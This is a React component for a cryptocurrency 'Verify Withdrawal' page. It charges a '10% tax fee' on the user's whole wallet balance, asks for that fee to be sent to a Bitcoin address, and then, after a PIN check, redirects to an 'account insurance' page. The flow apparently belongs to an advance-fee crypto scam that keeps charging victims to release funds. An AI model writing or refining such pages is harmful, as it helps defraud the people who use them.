import React, { useState, useEffect } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import api from '../../utils/api';
import './VerifyWithdrawal.css';

const VerifyWithdrawal = () => {
  const { state } = useLocation(); // { amount, crypto, address }
  const navigate = useNavigate();
  const [pin, setPin] = useState('');
  const [tax, setTax] = useState(0);
  const [error, setError] = useState('');

  useEffect(() => {
    const fetchTax = async () => {
      try {
        const res = await api.get('/user/profile');
        const fee = (res.data.walletBalance || 0) * 0.1;
        setTax(fee.toFixed(2));
      } catch {
        setTax(0);
      }
    };
    fetchTax();
  }, []);

  const handleVerify = async (e) => {
    e.preventDefault();
    try {
      await api.post('/user/verify-withdrawal', { pin });
      // On success, redirect to account insurance page
      navigate('/account-insurance', { state });
    } catch (err) {
      setError(err.response?.data?.message || 'Invalid PIN. Please try again.');
    }
  };

  return (
    <div className="verify-container">
      <div className="verify-card">
        <h2 className="verify-title">Verify Withdrawal</h2>

        <p><strong>Amount:</strong> ${state.amount}</p>
        <p><strong>Crypto:</strong> {state.crypto}</p>
        <p><strong>Wallet Address:</strong> {state.address}</p>

        <p><strong>Tax Fee (10%):</strong> ${tax}</p>
        <p>Please send your fee payment to the following Bitcoin address:</p>
        <code>535afgvshadsb534sfb</code>

        {error && <p className="error-message">{error}</p>}

        <form onSubmit={handleVerify} className="verify-form">
          <div className="form-group">
            <label className="form-label">Enter your 5-digit PIN</label>
            <input
              type="text"
              value={pin}
              onChange={(e) => setPin(e.target.value)}
              maxLength="5"
              className="form-input"
              required
            />
          </div>
          <button type="submit" className="verify-button">Verify & Continue</button>
        </form>
      </div>
    </div>
  );
};

export default VerifyWithdrawal;
